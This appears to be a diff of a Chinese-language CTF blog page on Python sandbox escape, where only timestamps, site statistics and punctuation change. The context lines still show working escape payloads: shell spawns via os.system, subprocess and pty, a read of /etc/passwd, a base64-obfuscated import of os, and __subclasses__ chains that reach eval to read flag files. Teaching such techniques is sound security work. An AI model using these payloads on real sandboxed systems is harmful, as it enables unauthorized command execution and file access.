@@ -127,7 +127,7 @@
 <meta property="og:site_name" content="w4rd3n">
 <meta property="og:description" content="简介 python沙箱,即以一定的方法模拟python终端.而沙箱逃逸就是绕过python沙箱得限制实现命令执行. python基础 模块导入 1234567import pwnfrom pwn import *#该方法不能永久导入__import__(&apos;pwn&apos;).p64(1111)#导入的模块a中的另一个模块b可以用a.b或者a.__dict__[&quot;b&quot;]间接访问模块b__import">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-09-08T12:39:07.347Z">
+<meta property="og:updated_time" content="2020-09-21T02:48:36.488Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="IS-pwn-escape-python沙箱逃逸">
 <meta name="twitter:description" content="简介 python沙箱,即以一定的方法模拟python终端.而沙箱逃逸就是绕过python沙箱得限制实现命令执行. python基础 模块导入 1234567import pwnfrom pwn import *#该方法不能永久导入__import__(&apos;pwn&apos;).p64(1111)#导入的模块a中的另一个模块b可以用a.b或者a.__dict__[&quot;b&quot;]间接访问模块b__import">
@@ -547,7 +547,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">'/bin/sh'</span>)</span><br><span class="line">os.popen(<span class="string">'/etc/passwd'</span>)</span><br><span class="line">os.getcwd()</span><br><span class="line">commands.getstatusoutput(<span class="string">'cat flag'</span>)<span class="comment">#执行shell命令,返回执行的标准输出和标准错误.</span></span><br><span class="line">commands.getoutput(<span class="string">'cat flag'</span>)<span class="comment">#执行shell命令,返回执行的输出.</span></span><br><span class="line">subprocess.call(<span class="string">'/bin/sh'</span>, shell = <span class="keyword">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">'cat flag'</span>, shell = <span class="keyword">True</span>)</span><br><span class="line">pty.spawn(<span class="string">'/bin/sh'</span>)</span><br><span class="line">execfile(<span class="string">'/usr/lib/python2.7/os.py'</span>)<span class="comment">#文件执行</span></span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('dir')"</span>, number = <span class="number">1</span>)</span><br><span class="line">eval(<span class="string">'__import__("os").system("dir")'</span>)</span><br><span class="line">exec(<span class="string">"os.system('cat flag')"</span>)</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">'dir'</span>).read()</span><br></pre></td></tr></table></figure>
 <h3 id="内置函数">内置函数</h3>
 <p><code>python</code>存在一些内置函数(即默认已经导入的函数),对应的内置模块<code>__builtins__</code>.</p>
-<p>其中内置函数<code>dir()</code>在没有参数的时候返回本地作用域中的名称列表,有参数的时候返回参数对象的有效属性列表.可以通过<code>dir(__builtins__)</code>获取内置函数列表,然后通过<code>dict</code>引入模块,<code>dict</code>的作用是列出一个模组<code>/</code>类<code>/</code>对象下所有的属性和函数.</p>
+<p>其中内置函数<code>dir()</code>在没有参数的时候返回本地作用域中的名称列表,有参数的时候返回参数对象的有效属性列表.可以通过<code>dir(__builtins__)</code>获取内置函数列表,然后通过<code>dict</code>引入模块,<code>dict</code>的作用是列出一个模组/类/对象下所有的属性和函数.</p>
 <p>一个模块对象有一个由字典对象实现的命名空间,属性的引用会被转换为这个字典中的查找,例如:<code>m.x</code>等同于<code>m.dict["x"]</code>.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#import __builtins__</span></span><br><span class="line">__builtins__.__dict__[<span class="string">'X19pbXBvcnRfXw=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>))</span><br><span class="line"><span class="comment">#__import__('os')</span></span><br></pre></td></tr></table></figure>
 <p>如果一些内置函数被删除,可以通过<code>reload(__builtins__)</code>重新载入.</p>
@@ -555,7 +555,7 @@
 <p>在<code>python3.x</code>版本中,<code>__builtin__</code>变成了<code>builtins</code>模块,而且需要导入.</p>
 <h3 id="object类基础函数">object类基础函数</h3>
 <p><code>python</code>的<code>object</code>类中集成了很多的基础函数,可以通过创建对象来引用.</p>
-<p>寻找特殊模块的方法:<code>__class__</code>,获得当前对象的类;<code>__bases__</code>,列出其基类;<code>__mro__</code>,列出解析方法的调用顺序(即类的继承关系);<code>__subclasses__()</code>,返回子类列表;<code>__dict__</code>,列出当前属性<code>/</code>函数的字典;<code>func_globals</code>,返回一个包含函数全局变量的字典引用.</p>
+<p>寻找特殊模块的方法:<code>__class__</code>,获得当前对象的类;<code>__bases__</code>,列出其基类;<code>__mro__</code>,列出解析方法的调用顺序(即类的继承关系);<code>__subclasses__()</code>,返回子类列表;<code>__dict__</code>,列出当前属性/函数的字典;<code>func_globals</code>,返回一个包含函数全局变量的字典引用.</p>
 <p>比如<code>().__class__.__bases__[0].__subclasses__()[40]</code>对应的是<code>file</code>类.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\flag'</span>).read()</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/hhh'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("cat flag").read()'</span>)</span><br></pre></td></tr></table></figure>
 <h3 id="f修饰符">f修饰符</h3>
@@ -927,7 +927,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">737k</span>
+    <span title="站点总字数">753k</span>
   
 
   
@@ -936,7 +936,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">11:10</span>
+    <span title="站点阅读时长">11:24</span>
   
 </div>
 
